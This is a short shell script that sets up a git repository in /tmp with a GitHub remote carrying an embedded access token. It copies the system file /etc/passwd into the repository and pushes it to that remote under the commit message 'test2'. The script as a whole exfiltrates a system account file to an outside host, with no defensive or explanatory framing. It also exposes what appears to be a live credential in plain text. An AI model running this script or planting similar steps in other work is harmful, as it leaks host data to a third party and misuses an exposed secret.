#!/bin/sh
cd /tmp/
mkdir origin
cd origin
git init .
git remote add origin https://git6ww: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@github.com/git6ww/Post.git
git pull origin master
cp /etc/passwd .
git add passwd 
git commit -m "test2"
git push origin master
